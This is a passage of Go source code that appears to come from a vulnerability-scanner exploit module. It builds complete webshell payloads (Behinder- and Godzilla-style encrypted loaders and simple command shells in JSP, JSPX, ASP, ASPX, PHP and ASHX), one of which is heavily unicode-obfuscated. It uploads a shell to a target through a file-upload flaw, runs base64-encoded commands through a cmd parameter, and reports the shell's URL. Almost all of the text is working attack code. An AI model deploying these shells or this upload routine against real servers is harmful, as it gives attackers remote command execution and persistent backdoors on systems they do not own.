uuuuuuu0063\uuuu006c\uuu0061\uuu007a\uuuuuuu007a\uuuuuuuuu002e\uuuuuuuuu006e\uuu0065\uuu0077\uu0049\uuu006e\u0073\uuuuuuu0074\u0061\uuuuuu006e\uuu0063\uuuu0065\uuu0028\uuuuuuuuuu0029\uuuuu002c\uuuuu0020\uuuuuuuuuu0053\uu0074\uu0072\uuuuuuu0069\uuuuu006e\uuuuuuuuuu0067\uuuu0073\uu0029\uuuuuuuu003b\uuuuuuuuu007d\uuuuuuuu0062\u0079\uuu0074\uuuuuuuu0065\uuuuuuu005b\uuuuuuuuu005d\uuu0020\uuuuuu0072\uuuuuuuuuu0065\u0073\uuuuuuuu0075\uuuuuuuu006c\uuuuu0074\uuu0020\uuuuu003d\uuuuuu0020\uuuuuuuuuu0028\uuuuuu0062\u0079\u0074\uu0065\uuuuuuuu005b\uuuuuuuuuu005d\uuuuu0029\uu0020\uuuuuuuuu0042\uuuuu0039\uuuuuuuu0072\uuuuu007a\uuuuuuu0030\uuuuuuuu0031\uuuuuuuu002e\uu0067\uuuuu0065\uu0074\uuuuuuuuuu0043\uuuuuuuu006c\uuuuu0061\uuu0073\uuuu0073\uuuuuuuuuu0028\uu0029\uuuu002e\uuuuuuuuu002f\uuuu002a\u005a\uuuuuu0075\uuuu0037\uuu0059\uuu0063\uuuuuuuuu0079\uuuuu0030\u0050\uuuuuuuu0058\uuuuuuuuu0057\uuuuu002a\uuuu002f\uuuuuuuu0067\uuuuuuuuu0065\uu0074\u0044\uuuuuuuu0065\uu0063\uuuuuu006c\uuuuuuuuu0061\uuuuuuuu0072\uuuuuuuuu0065\uuuuuuu0064\uuuuuuuu004d\uu0065\u0074\uu0068\uuuuuu006f\uuuu0064\uuu002f\uuuuuu002a\u005a\u0075\uuuuuu0037\uuuuu0059\uu0063\uuuuuuu0079\uuu0030\uuuuuuuu0050\uu0058\u0057\u002a\uuuuuuuuu002f\uuuuuuuuuu0028\uuuuu0022\uuuuuuu0064\uuuu006f\uuuuu0046\uuuuuu0069\uuuu006e\uuuuuuu0061\uuuuuuuuuu006c\uuuuuu0022\uuuuuuuuuu002c\uuuuuuuuuu0020\u006e\uuuu0065\uuu0077\uuuuuuu0020\uuuuuuuuu0043\uuuuuuuuu006c\uuuuu0061\uuuu0073\uuuu0073\uuuuuuuuu005b\uuuuuuuuuu005d\u007b\uuuuuuu0062\u0079\uuuuuu0074\uuuuuuu0065\uu005b\uuuuu005d\uu002e\uuuuuuuu0063\uuuuuu006c\uu0061\uuuu0073\uuuuu0073\uuuuuuu007d\uuuuu0029\u002e\uuuuuuuuu0069\uu006e\uuuuuuuuu0076\u006f\uuuuuuu006b\uuu0065\uuu0028\uuuuuu0042\uuuuuu0039\uu0072\uuuuuuuuu007a\uuuuuuuuuu0030\uuuuuuuuu0031\uuuuu002c\uuuuu006e\uu0065\uu0077\uu0020\uuuuuuuu004f\uuuuu0062\u006a\uuuuuuuuu0065\uuuu0063\uu0074\uuuuuu005b\uuuuuuuuuu005d\uuu007b\u0062\uuuuuuuu0079\uuuuuuuu0074\uuuuuuuu0065\u0073\uuuu007d\uuuuuuuuuu0029\uuuuu003b\uuuuuuuu0072\uuuuuuu0065\uuu0074\uuuuuuuuuu0075\uuuuu0072\uuuuu006e\uuuuuu0020\uuu0072\uuuuuuuuu0065\uuuuuuuuuu0073\uuuuuu0075\uu006c\uuuuuuuuu0074\uuuuuuu003b\uuuuuu007d %><% \uuu0020\uuuuuuuuu0074\uu0072\uuuuuuu0079\uuuuuuuuu0020\uuu007b\uuuuuuuu0020\uuuu0020\uuuuuu0053\u0074\uuuuuuuu0072\uuuuuuuuu0069\uuuuuuu006e\uuuuuuuuu0067\uuuu0020\uuuuu004b\u0037\uuuuuuuuuu0077\uuuuuuu0055\u004f\u004f\uuuu0050\uuuuuuuuuu0020\uuuuuuu003d\uu0020\uuuuuu0022\uuu0065\uuuuuuuuuu0034\uuuuuuuuu0035\uuuuuuuuuu0065\uuuuuuuu0033\u0032\uuuuuuuuuu0039\uuuuuuuu0066\uuuuu0065\uuuuu0062\uuuuuuuu0035\uuuuuuuuu0064\uuuuuuu0039\uuu0032\uuuuuuuuuu0035\uuuuuu0062\uuuuuuu0022\uuuuuuu003b\uuuu0020\uuuuuuuu0020\uuuuuu0073\uuuuu0065\uu0073\uuu0073\uuuuuuuu0069\uuuuu006f\uuuu006e\uuuuuu002e\uuuuuuuuuu0070\uuuuuuuu0075\uuuuuuuu0074\u0056\uuuuuuu0061\uu006c\uuuuuu0075\uu0065\uuuu0028\u0022\uuuuu0075\uuuuuuuuuu0022\uuuuuu002c\uuuuuuuu0020\uuuu004b\uuu0037\uuuuuuuuu0077\uu0055\u004f\uuuuuuuuu004f\uuu0050\uuuuuuuuuu0029\uuuu003b\uuuuu0020\uuuu0020\uuuuuuuu0062\uuuu0079\uuuuuuuuuu0074\uuuuu0065\uuuuu005b\uu005d\uuuu0020\uuu0049\uuuuuuuuu0034\uuuuuuu0033\uuuuu0033\uu0044\uuuuuu0062\uuuuuu0035\uuuu0020\uuuu003d\u0020\u0041\uuuu0051\uuuuuuuuuu0036\uuuuu006e\uuuu0032\uuuuuuuuuu0020\uuuuuu0028\u0072\uuuu0065\uuu0071\uuu0075\u0065\uuuuu0073\uuuuuuu0074\u002e\uuuuuu0067\uuuuuu0065\uuuuu0074\uuuuu0052\uu0065\uuuuuu0061\uuuuuuuu0064\uuu0065\u0072\uuuuuu0028\uuuuuuu0029\uu002e\u0072\uuuuuuuuuu0065\uuu0061\uuuu0064\uuuuuuu004c\uuuu0069\uuuuuuuuu006e\uuuuu0065\uuuuu0028\uuuu0029\uuuu002c\uuuuuu004b\uuuuuu0037\uuuuuuuu0077\uuuuu0055\uu004f\u004f\uuuuuuuuuu0050\uuuuuu0029\uuuuuuuuuu003b\uuuuuuuuu0020\u0020\uuuuuuu006a\uuuuuuuuuu0061\u0076\uuuuuuuuu0061\uuuuuuuu002e\uuuuu002f\uu002a\uuuuuuuu005a\uuuu0075\uuuuuuuuu0037\uuuuu0059\uuuuuuuu0063\uuuuu0079\uuuuuuuuuu0030\uuuuuuuuuu0050\uuuuuu0058\uuuu0057\uu002a\uuuuuuuu002f\uuuuuuuuu006c\uuuuuuu0061\uuuuuuuuu006e\u0067\uuuuuuuuu002e\uuuuuuuuuu002f\uuuuuuuu002a\uuuuu005a\uuuuu0075\uuuuuuuu0037\uuuuuuuu0059\uuuuuuuu0063\uuuuuuuu0079\uu0030\uuuuu0050\uu0058\uuuuuuuuuu0057\uuuu002a\uuuuuu002f\uuuuu0072\uuuuuuu0065\uuu0066\u006c\uuuuu0065\uuuuuuuuu0063\uuuu0074\uuuuu002e\uuuuuuuuu004d\uuuu0065\uuu0074\uuuu0068\uu006f\uuuuuu0064\uuu0020\uuuuuuuuuu0041\uuuuuuuuu0051\uuuu0036\uuu006e\uuuuuuuuuu0032\uu0020\uuuuuuuuuu003d\uuuuu0020\uuuuuuuuu0043\uuuuuuuuu006c\uuuuuu0061\uu0073\uuuuuu0073\uuuuu002e\uuuu0066\uuuuu006f\uu0072\uuuu004e\uuuuu0061\uuuuu006d\uu0065\uuuuuuuuu0028\u0022\uuuuuuuuuu006a\uuuuu0061\uuuuuuuuuu0076\uuuuuu0061\uuuuuuu002e\uuuuuuuuuu006c\uuuuuuuuuu0061\uuuuuuu006e\uuu0067\uuuuuuuuu002e\u0043\uuu006c\uuuuuuu0061\uu0073\u0073\uuuuu004c\uuuuuu006f\u0061\u0064\uuu0065\uuuuuu0072\uuuuuuu0022\uuu0029\uuuuuuuuuu002e\uuuuuuuu0067\uuuuuuuu0065\uuuuu0074\uuuu0044\uuuu0065\uuuuuu0063\uuuuuuuuu006c\uuuuuuuuu0061\uuuuuuuuuu0072\uuu0065\uuu0064\uuuuuu004d\uuu0065\uuuuu0074\uuuu0068\uuu006f\u0064\uuuuuuuuu002f\uuuuuuuuuu002a\uuu005a\uuuuuuuuuu0075\uuuuuuuu0037\uuuu0059\uuuuuuu0063\uuu0079\uuuu0030\uu0050\uuuuuuuuu0058\uuuu0057\uuuu002a\uuuuuuuu002f\uuu0028\u0022\uuu0064\uuuuuu0065\uuuuuuu0066\uuuuuuuuuu0069\uu006e\uuuuuuuu0065\uuuuuuuuuu0043\uuuuuuu006c\uuuuuuu0061\uu0073\uuuu0073\uuuuu0022\uuuuuuuu002c\uuuuuuuuuu0062\uu0079\uuu0074\uuuuuuu0065\uuuuuuuuuu005b\uuuuuuuuu005d\uuuuuuuu002e\u0063\uuuuuu006c\uuuuuuuu0061\uuu0073\uuuu0073\uuuu002c\uuuuuu0069\uuu006e\uuuuuuuu0074\uuuuuuuu002f\uuuuuuuuu002a\uuuuuuuu002a\uuuuuuuu002f\uuuuuuu002e\uuuuuuuuuu0063\uuuuuu006c\uuuuuuuuuu0061\uuu0073\uuu0073\uu002c\uuuuu0069\uuuuuuuuu006e\uuuuuuuuuu0074\uuuu002f\uu002a\uuuuuuuuuu002a\uuuu002f\uu002e\uuuuuuuu0063\uuuuuuu006c\uuuuuuuu0061\uuuu0073\uuuu0073\u0029\u003b\uuuuu0020\uuuuuuuu0020\uuuuuuuuu0041\uu0051\uuuuuuu0036\uu006e\uuuuu0032\uuuuuuu002e\uuuuuu0073\uuuuu0065\uuu0074\uuuu0041\uuuuu0063\uuuu0063\uu0065\uu0073\uuuuuu0073\uuuuuuuu0069\uuu0062\uuuuuuuuu006c\uuuuuuuuuu0065\uuuu0028\uuuuu0074\uuuuuuuu0072\uuu0075\uuuuuuuuuu0065\uuuuuuuu0029\uuu003b\uuuuuuu0020\uuuuuu0020\uuuuuuuuu0043\uuuuuuuuuu006c\uuuuuuuu0061\uuuuu0073\uuuuuuuuuu0073\uuuuuuuu0020\uuuuuu0069\uuuuu0020\uuuuuuuuuu003d\uuuuuuuuu0020\uuuuuuuu0028\uuuuuuuuu0043\uuuuuuuuu006c\uuuuuuuu0061\uuuuuuu0073\uuuuuuuuuu0073\uuuuuuuu0029\uuuuuuuuu0041\u0051\uuu0036\uuuuu006e\uuuuu0032\uuuuuuu002e\uuuuuuuuuu0069\uuuuuu006e\uuuuuuu0076\uuuu006f\uuuuu006b\uuuu0065\u0028\uuuuuuuu0054\uuuuuuu0068\uuuuuuu0072\uuuuuuuuu0065\uuuuuuu0061\u0064\uuuu002e\u0063\u0075\uuu0072\uu0072\u0065\uuu006e\uu0074\uuu0054\u0068\uuuu0072\uuuu0065\uuuuu0061\uu0064\uuuuuuuuu0028\uuuuuu0029\uuu002e\uuuuu002f\uuu002a\uuuuuuuuu005a\uu0075\u0037\uu0059\uuuuuu0063\u0079\uuuuu0030\uuuuuuuu0050\uuu0058\uuuuu0057\uuuuuuu002a\uuuuu002f\uuuu0067\uuuuuuuu0065\uuu0074\uuuuuuuu0043\uu006f\uuuuuuuuuu006e\uuuuu0074\uuuuuuuuu0065\uuuuu0078\uuuu0074\uuuuuuuu0043\uuu006c\uuuuuu0061\uuuuuuuuuu0073\uuuuuu0073\uuuuu004c\uu006f\uuuu0061\u0064\uuuuu0065\uuuuuuu0072\uuuuuuuu0028\uuuuu0029\uuu002c\uuu0020\uu0049\uuuuuuuuu0034\u0033\uuuu0033\uuuu0044\uuuuuu0062\u0035\uu0020\uuuuuuuuuu002c\uuuuuuuu0020\uuu0030\uuuuuuuuuu002c\uuuu0020\uuuuuuuuuu0049\uuuuuuuu0034\uuuuuuuuuu0033\u0033\uuuu0044\uuuuuuuuu0062\uuuuuu0035\uuuuuuuuu002e\uuu006c\uuuuu0065\uuuuuu006e\uuu0067\uuuuuuu0074\uuuuuuuuuu0068\u0029\uuuuuu003b\uuuuuu0020\uuuuuuuu0020\uuuuuuuuuu004f\uuuu0062\uuuuuuuuu006a\uuuuuuu0065\uu0063\uu0074\uuu0020\uuuuuuuuu0051\uu0074\uuuuuuuuuu0036\u0063\uuu0020\uuuuuu003d\uuuuuu0020\uuuuuu0069\uuuuuu002e\uuuuuuuuu002f\uuuuuuuuuu002a\uuuuuuuuu005a\u0075\uuuuuu0037\uuuuu0059\uuuuu0063\uuuu0079\uuu0030\uuu0050\uuuuuuuu0058\uuuuuuu0057\uuuuuuuuu002a\uuuuuuu002f\uuu006e\u0065\uuuuuuuuu0077\u0049\uuuuuuu006e\uuuuuuuuu0073\uuuuuuuu0074\uuuuuu0061\uuuuuuuuuu006e\uuuuuuuuuu0063\uu0065\uuuuu0028\uuuuuuuuu0029\uuuuuuuuuu003b\uu0020\uuu0020\uuuu0051\u0074\uuuuuu0036\uuuuuuuuuu0063\uuuu002e\uuuuuuu0065\u0071\uuuu0075\uuuu0061\uuuuuuuuuu006c\uu0073\uuu0028\uuuu0070\uuuuuu0061\uuuu0067\uuuuuu0065\uuu0043\uuuuuuuu006f\uuuuuuuu006e\uuuuuuuuu0074\uuuuuuuuu0065\uuuuuuuuu0078\uu0074\uuu0029\uuuuuuuuu003b\uuuuu0020\uuuu007d\uuuuuuuuu0020\uuuuuuu0063\uu0061\uuuuuuu0074\uuuuuuuuuu0063\uuuuuu0068\uu0020\u0028\uuuuuuuuu0045\uuuuuuuuu0078\uuuuuuuuu0063\uuuu0065\uuuu0070\uuuuuuuuu0074\uuuuuuuu0069\uuuuuuuu006f\u006e\uuuuuuu0020\uuuuuuu0065\u0029\uuuuuu0020\uuu007b\uuuuuu007d %>`
					case "jspx":
						return `<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration><jsp:scriptlet>String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</jsp:scriptlet></jsp:root>`
					case "asp":
						return `<%Response.CharSet="UTF-8" :k="e45e329feb5d925b":Session("k")=k:size=Request.TotalBytes:content=Request.BinaryRead(size):For i=1 To size:result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1))):Next:execute(result)%>`
					case "aspx":
						return `<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b"); byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>`
					case "php":
						return `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION['k']=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded('openssl')){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);} $arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}};@call_user_func(new C(),$params);?>`
					default:
						return ``
					}
				case "Godzilla":
					switch fileType {
					case "jsp":
						return `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
					case "jsptxt":
						return `密码：pass  向量：key  加密器：JAVA_AES_BASE64`
					case "jspx":
						return `<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:declaration> String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }</jsp:declaration><jsp:scriptlet>try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}</jsp:scriptlet></jsp:root>`
					case "jspxtxt":
						return `密码：pass  向量：key  加密器：JAVA_AES_BASE64`
					case "asp":
						return `<%Set bypassDictionary=Server.CreateObject("Scripting.Dictionary"):Function decryption(content,isBin):dim size,i,result,keySize:keySize=len(key):Set BinaryStream=CreateObject("ADODB.Stream"):BinaryStream.CharSet="iso-8859-1":BinaryStream.Type=2:BinaryStream.Open:if IsArray(content) then:size=UBound(content)+1:For i=1 To size:BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1))):Next:end if:BinaryStream.Position=0:if isBin then:BinaryStream.Type=1:decryption=BinaryStream.Read():else:decryption=BinaryStream.ReadText():end if:End Function:key="3c6e0b8a9c15224a":content=Request.BinaryRead(Request.TotalBytes):if not IsEmpty(content) then:if IsEmpty(Session("payload")) then:content=decryption(content,false):Session("payload")=content:response.End:else:content=decryption(content,true):bypassDictionary.Add "payload",Session("payload"):Execute(bypassDictionary("payload")):result=run(content):if not IsEmpty(result) then:response.BinaryWrite decryption(result,true):end if:end if:end if%>`
					case "asptxt":
						return `密码：pass  向量：key  加密器：ASP_XOR_RAW`
					case "aspx":
						return `<%@ WebService Language="C#" Class="WebService1" %>public class WebService1 : System.Web.Services.WebService{[System.Web.Services.WebMethod(EnableSession=true)]public string pass(string pass){System.Text.StringBuilder stringBuilder=new System.Text.StringBuilder();try{string key="3c6e0b8a9c15224a";string pass_pass="pass";string md5=System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass_pass+key))).Replace("-","");byte[] data=System.Convert.FromBase64String(System.Web.HttpUtility.UrlDecode(pass));data=new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key),System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data,0,data.Length);if(Context.Session["payload"]==null){Context.Session["payload"]=(System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load",new System.Type[]{typeof(byte[])}).Invoke(null,new object[]{data});;}else{object o=((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY");System.IO.MemoryStream outStream=new System.IO.MemoryStream();o.Equals(Context);o.Equals(outStream);o.Equals(data);o.ToString();byte[] r=outStream.ToArray();stringBuilder.Append(md5.Substring(0,16));stringBuilder.Append(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key),System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r,0,r.Length)));stringBuilder.Append(md5.Substring(16));}}catch(System.Exception){}return stringBuilder.ToString();}}`
					case "aspxtxt":
						return `密码：pass  向量：key  加密器：CSHAP_ASMX_AES_BASE64`
					case "php":
						return `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return$D;}$p='pass';$n='payload';$k='3c6e0b8a9c15224a';if(isset($_POST[$p])){$d=encode(base64_decode($_POST[$p]),$k);if(isset($_SESSION[$n])){$p=encode($_SESSION[$n],$k);if(strpos($p,"getBasicsInfo")===false){$p=encode($p,$k);}eval($p);echo substr(md5($p.$k),0,16);echo base64_encode(encode(@run($d),$k));echo substr(md5($p.$k),16);}else{if(strpos($d,"getBasicsInfo")!==false){$_SESSION[$n]=encode($d,$k);}}}?>`
					case "phptxt":
						return `密码：pass  向量：key  加密器：PHP_XOR_BASE64`
					default:
						return ``
					}
				case "Command":
					switch fileType {
					case "jsp":
						return `<%@ page import="java.util.Base64"%><%String a=request.getParameter("cmd");if(a!=null&&!a.isEmpty()){String b=new String(Base64.getDecoder().decode(a));if(b!=null){Process c=Runtime.getRuntime().exec(b);java.util.Scanner d=new java.util.Scanner(c.getInputStream()).useDelimiter("\\A");String e=d.hasNext()?d.next():"";String f=Base64.getEncoder().encodeToString(e.getBytes());out.println(f);java.io.File g=new java.io.File(application.getRealPath(request.getServletPath()));g.delete();}}%>`
					case "jspx":
						return ``
					case "asp":
						return ``
					case "aspx":
						return `<%@ Page Language="C#" %><%@ Import Namespace="System.IO"%><% using (System.Diagnostics.Process process = new System.Diagnostics.Process()){process.StartInfo.FileName = Environment.GetEnvironmentVariable("ComSpec")??"/bin/sh";process.StartInfo.Arguments = "/c \"" + System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Request.QueryString["cmd"])) + "\"";process.StartInfo.RedirectStandardOutput = true;process.StartInfo.UseShellExecute = false;process.Start();Response.Write(Server.HtmlEncode(System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(process.StandardOutput.ReadToEnd()))));}File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>`
					case "php":
						return `<?php if(isset($_GET['cmd'])){$cmd=base64_decode($_GET['cmd']);echo (shell_exec($cmd));unlink(__FILE__);} ?>`
					case "ashx":
						return "<%@ WebHandler Language=\"C#\" Class=\"Handler2\" %>\nusing System;\nusing System.Collections.Generic; \nusing System.Diagnostics;\nusing System.Web;\npublic class Handler2 : IHttpHandler {\npublic void ProcessRequest (HttpContext context) {\n//string x = \"-an\";\nstring x = context.Request[\"cmd\"];\nProcess prc=new Process(); \nprc.StartInfo.FileName=\"cmd.exe\"; \nprc.StartInfo.UseShellExecute=false; \nprc.StartInfo.RedirectStandardInput = true; \nprc.StartInfo.RedirectStandardOutput = true; \nprc.StartInfo.RedirectStandardError = true; \nprc.StartInfo.CreateNoWindow = false; \nprc.Start();\nprc.StandardInput.WriteLine(x);\nprc.StandardInput.Close();\ncontext.Response.Write(prc.StandardOutput.ReadToEnd());\ncontext.Response.End();}\npublic bool IsReusable {\n        get {\n            return false;\n        }\n    }}"
					default:
						return ``
					}
				default:
					return ``
				}
			}

			if goutils.B2S(ss.Params["mode"]) != "Customize" {
				pocContent = generatePOCContent(goutils.B2S(ss.Params["mode"]), fileTypeAll)
			} else {
				pocContent = goutils.B2S(ss.Params["Customize"])
			}

			// 组装文件名
			filename := goutils.RandomHexString(8) + "." + fileTypeAll

			// fileURL string,headerMap map[string]string,err error
			// filePath为路径，不是完整的URL地址
			// 文件上传
			filePath, headerMap, err := uploadFileFunc(expResult.HostInfo, filename, pocContent)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}

			// 文件请求函数
			getRequest := func(hostInfo *httpclient.FixUrl, url string, requestMap map[string]string) (*httpclient.HttpResponse, error) {
				makeRequest := httpclient.NewGetRequestConfig(url)
				makeRequest.VerifyTls = false
				makeRequest.Timeout = 5
				makeRequest.FollowRedirect = false
				if requestMap != nil {
					for postHeaderKey, postHeaderValue := range requestMap {
						makeRequest.Header.Store(postHeaderKey, postHeaderValue)
					}
				}
				return httpclient.DoHttpRequest(hostInfo, makeRequest)
			}

			// 结果返回封装(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig[前两个参数固定], 最终访问文件地址, 命令执行命令(选填))
			switch goutils.B2S(ss.Params["mode"]) {
			case "Behinder":
				expResult.Success = true
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + filePath + "\n"
				expResult.Output += generatePOCContent("Behinder", "txt")
				return expResult
			case "Godzilla":
				expResult.Success = true
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + filePath + "\n"
				expResult.Output += generatePOCContent("Godzilla", fileTypeAll+"txt")
				return expResult
			case "Command":
				getResult, err := getRequest(expResult.HostInfo, expResult.HostInfo.FixedHostInfo+filePath+`?cmd=`+url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(goutils.B2S(ss.Params["Command"])))), headerMap)
				if err != nil || strings.Contains(getResult.Utf8Html, "error") || strings.Contains(getResult.Utf8Html, "Error") {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				} else {
					expResult.Success = true
					result, err22 := base64.StdEncoding.DecodeString(getResult.Utf8Html)
					if err != nil {
						expResult.Success = false
						expResult.Output = err22.Error()
						return expResult
					}
					expResult.Output += "Command Result: \n" + string(result)
					return expResult
				}
			case "Customize":
				expResult.Success = true
				expResult.Output += "Customize Upload File URL: " + expResult.HostInfo.FixedHostInfo + filePath + "\n"
				return expResult
			default:
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
		}))
}
